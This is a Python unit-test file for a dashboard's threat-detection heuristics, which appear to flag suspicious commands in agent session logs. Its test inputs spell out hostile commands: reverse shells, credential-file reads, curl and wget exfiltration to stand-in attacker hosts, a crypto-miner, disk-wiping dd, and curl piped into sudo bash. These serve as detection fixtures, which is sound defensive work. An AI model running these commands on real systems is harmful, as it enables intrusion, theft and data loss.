"""Pure-unit tests for the threat-detection heuristics in dashboard.py.

Closes one unmet acceptance criterion from issue #877: "test cases for each
implemented heuristic."  These tests exercise ``_scan_events_for_threats``
directly — no Flask, no DuckDB, no network.  The HTTP surface is covered by
the existing integration tests in ``test_api.py``.

Each SEC-* test builds a minimal brain-history event that should trigger that
signature, then asserts the rule fires and the returned threat object has the
expected fields.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import dashboard  # noqa: E402 — registers _THREAT_SIGNATURES at import time


# ── helpers ────────────────────────────────────────────────────────────────────


def _ev(detail: str, ev_type: str = "EXEC", source: str = "sess-1", time: str = "2026-01-01T00:00:00Z") -> dict:
    return {"source": source, "type": ev_type, "detail": detail, "time": time, "sourceLabel": source}


def _rule_ids(threats: list) -> set:
    return {t["rule_id"] for t in threats}


def _scan(events):
    return dashboard._scan_events_for_threats(events)


# ── one positive test per signature ────────────────────────────────────────────


def test_sec001_reverse_shell_bash_i():
    threats, counts = _scan([_ev("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")])
    assert "SEC-001" in _rule_ids(threats)
    assert counts["critical"] >= 1


def test_sec001_mkfifo_pipe():
    threats, _ = _scan([_ev("mkfifo /tmp/f; nc -lk 9001 < /tmp/f | /bin/bash > /tmp/f")])
    assert "SEC-001" in _rule_ids(threats)


def test_sec002_etc_shadow():
    threats, counts = _scan([_ev("cat /etc/shadow", ev_type="READ")])
    assert "SEC-002" in _rule_ids(threats)
    assert counts["critical"] >= 1


def test_sec002_ssh_private_key():
    threats, _ = _scan([_ev("cp ~/.ssh/id_rsa /tmp/key", ev_type="EXEC")])
    assert "SEC-002" in _rule_ids(threats)


def test_sec002_aws_credentials():
    threats, _ = _scan([_ev("cat ~/.aws/credentials", ev_type="READ")])
    assert "SEC-002" in _rule_ids(threats)


def test_sec003_sudo_su():
    threats, counts = _scan([_ev("sudo su -")])
    assert "SEC-003" in _rule_ids(threats)
    assert counts["critical"] >= 1


def test_sec003_setuid_bit():
    threats, _ = _scan([_ev("chmod u+s /usr/bin/python3")])
    assert "SEC-003" in _rule_ids(threats)


def test_sec004_curl_post_data():
    threats, counts = _scan([_ev("curl --data 'user=admin&pass=secret' https://evil.example.com/collect")])
    assert "SEC-004" in _rule_ids(threats)
    assert counts["high"] >= 1


def test_sec004_wget_post_file():
    threats, _ = _scan([_ev("wget --post-file=/tmp/secrets https://attacker.net")])
    assert "SEC-004" in _rule_ids(threats)


def test_sec005_ssh_external_host():
    threats, counts = _scan([_ev("ssh attacker@198.51.100.1 'cat /etc/passwd'")])
    assert "SEC-005" in _rule_ids(threats)
    assert counts["high"] >= 1


def test_sec005_scp_remote():
    threats, _ = _scan([_ev("scp /tmp/data.tar.gz attacker@198.51.100.1:/")])
    assert "SEC-005" in _rule_ids(threats)


def test_sec006_xmrig_miner():
    threats, counts = _scan([_ev("./xmrig --pool stratum+tcp://pool.minexmr.com:4444 -u wallet")])
    assert "SEC-006" in _rule_ids(threats)
    assert counts["high"] >= 1


def test_sec007_rm_rf_system_path():
    threats, counts = _scan([_ev("rm -rf /etc/nginx")])
    assert "SEC-007" in _rule_ids(threats)
    assert counts["medium"] >= 1


def test_sec007_dd_to_dev():
    threats, _ = _scan([_ev("dd if=/dev/zero of=/dev/sda bs=1M")])
    assert "SEC-007" in _rule_ids(threats)


def test_sec008_pip_custom_index():
    threats, counts = _scan([_ev("pip install mypackage --index-url http://evil.pypi.example.com")])
    assert "SEC-008" in _rule_ids(threats)
    assert counts["medium"] >= 1


def test_sec008_curl_pipe_bash():
    threats, _ = _scan([_ev("curl https://suspicious.example.com/install.sh | sudo bash")])
    assert "SEC-008" in _rule_ids(threats)


def test_sec009_ufw_allow():
    threats, counts = _scan([_ev("ufw allow from any to any port 22")])
    assert "SEC-009" in _rule_ids(threats)
    assert counts["medium"] >= 1


def test_sec009_setenforce_zero():
    threats, _ = _scan([_ev("setenforce 0")])
    assert "SEC-009" in _rule_ids(threats)


def test_sec010_crontab():
    threats, counts = _scan([_ev("crontab -l")])
    assert "SEC-010" in _rule_ids(threats)
    assert counts["medium"] >= 1


def test_sec010_systemctl_enable():
    threats, _ = _scan([_ev("systemctl enable mybackdoor.service")])
    assert "SEC-010" in _rule_ids(threats)


def test_sec011_nmap_scan():
    threats, counts = _scan([_ev("nmap -sV -p 1-65535 192.168.1.0/24")])
    assert "SEC-011" in _rule_ids(threats)
    assert counts["low"] >= 1


def test_sec012_wget_suspicious_url():
    threats, counts = _scan([_ev("wget http://suspicioushost.example.com/rootkit.sh")])
    assert "SEC-012" in _rule_ids(threats)
    assert counts["low"] >= 1


def test_sec012_no_hit_for_github():
    # github.com is whitelisted — should NOT trigger SEC-012
    threats, _ = _scan([_ev("wget https://github.com/user/repo/archive/main.tar.gz")])
    assert "SEC-012" not in _rule_ids(threats)


def test_sec013_printenv():
    threats, counts = _scan([_ev("printenv")])
    assert "SEC-013" in _rule_ids(threats)
    assert counts["medium"] >= 1


def test_sec013_cat_dotenv():
    threats, _ = _scan([_ev("cat .env", ev_type="READ")])
    assert "SEC-013" in _rule_ids(threats)


def test_sec014_gdb_attach():
    threats, counts = _scan([_ev("gdb -p 1234")])
    assert "SEC-014" in _rule_ids(threats)
    assert counts["high"] >= 1


def test_sec014_ld_preload():
    threats, _ = _scan([_ev("LD_PRELOAD=/tmp/evil.so ./target")])
    assert "SEC-014" in _rule_ids(threats)


def test_sec015_browser_aws_console():
    threats, counts = _scan([_ev("https://console.aws.amazon.com/iam", ev_type="BROWSER")])
    assert "SEC-015" in _rule_ids(threats)
    assert counts["high"] >= 1


def test_sec015_browser_admin_panel():
    threats, _ = _scan([_ev("http://192.168.1.1/admin", ev_type="BROWSER")])
    assert "SEC-015" in _rule_ids(threats)


# ── negative / edge cases ──────────────────────────────────────────────────────


def test_empty_events_returns_empty():
    threats, counts = _scan([])
    assert threats == []
    assert counts["total"] == 0
    assert counts["sessions_scanned"] == 0


def test_clean_event_no_match():
    threats, counts = _scan([_ev("echo hello world")])
    assert threats == []
    assert counts["total"] == 0
    assert counts["clean_sessions"] == 1


def test_wrong_type_does_not_fire():
    # SEC-001 only fires on EXEC; same text in a READ event should not match
    threats, _ = _scan([_ev("bash -i /dev/tcp/10.0.0.1/4444", ev_type="READ")])
    assert "SEC-001" not in _rule_ids(threats)


def test_browser_exec_mismatch():
    # SEC-015 fires on BROWSER/SEARCH; should not fire on EXEC type
    threats, _ = _scan([_ev("console.aws.amazon.com", ev_type="EXEC")])
    assert "SEC-015" not in _rule_ids(threats)


def test_empty_detail_skipped():
    ev = {"source": "s1", "type": "EXEC", "detail": "", "time": "", "sourceLabel": "s1"}
    threats, counts = _scan([ev])
    assert threats == []


def test_counts_structure():
    threats, counts = _scan([_ev("bash -i >& /dev/tcp/1.2.3.4/9001 0>&1")])
    for key in ("critical", "high", "medium", "low", "total", "sessions_scanned", "clean_sessions"):
        assert key in counts, f"counts missing key: {key}"
    assert counts["total"] == len(threats)


def test_threat_fields():
    threats, _ = _scan([_ev("sudo su -")])
    assert threats, "expected at least one threat"
    t = threats[0]
    for field in ("rule_id", "severity", "description", "detail", "time", "session", "source", "event_type"):
        assert field in t, f"threat missing field: {field}"


def test_multiple_sessions_count():
    events = [
        _ev("bash -i /dev/tcp/1.2.3.4/9001", source="session-A"),
        _ev("echo safe", source="session-B"),
    ]
    threats, counts = _scan(events)
    assert counts["sessions_scanned"] == 2
    assert counts["clean_sessions"] == 1
